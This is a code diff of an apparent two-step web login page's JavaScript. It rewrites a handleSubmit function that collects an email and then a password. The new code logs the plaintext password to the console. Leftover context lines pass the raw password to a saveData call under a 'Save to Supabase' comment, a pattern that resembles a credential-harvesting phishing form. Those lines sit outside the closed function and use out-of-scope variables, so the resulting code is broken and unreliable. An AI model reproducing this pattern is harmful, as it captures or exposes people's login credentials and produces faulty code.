@@ -160,25 +160,53 @@
         const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
         
         let step = 1;
+
+function handleSubmit() {
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const submitBtn = document.getElementById('submitBtn');
+    
+    if (step === 1) {
+        // Step 1: Get email
+        const email = emailInput.value.trim();
         
-        function handleSubmit() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password');
-            
-            if (step === 1) {
-                if (!email) {
-                    alert('Enter email');
-                    return;
-                }
-                password.style.display = 'block';
-                document.getElementById('submitBtn').textContent = 'Sign in';
-                step = 2;
-            } else if (step === 2) {
-                if (!password.value) {
-                    alert('Enter password');
-                    return;
-                }
-                
+        if (!email) {
+            alert('Please enter your email');
+            return;
+        }
+        
+        // Show password field
+        passwordInput.style.display = 'block';
+        submitBtn.textContent = 'Sign in';
+        step = 2;
+        
+        // Focus on password field
+        setTimeout(() => passwordInput.focus(), 100);
+        
+    } else if (step === 2) {
+        // Step 2: Get password
+        const password = passwordInput.value;
+        
+        if (!password) {
+            alert('Please enter your password');
+            return;
+        }
+        
+        // Process login (add your logic here)
+        console.log('Login attempt:', {
+            email: emailInput.value,
+            password: password,
+            timestamp: new Date().toISOString()
+        });
+        
+        // Reset form
+        emailInput.value = '';
+        passwordInput.value = '';
+        passwordInput.style.display = 'none';
+        submitBtn.textContent = 'Next';
+        step = 1;
+    }
+}
                 // Save to Supabase
                 saveData(email, password.value);
                 
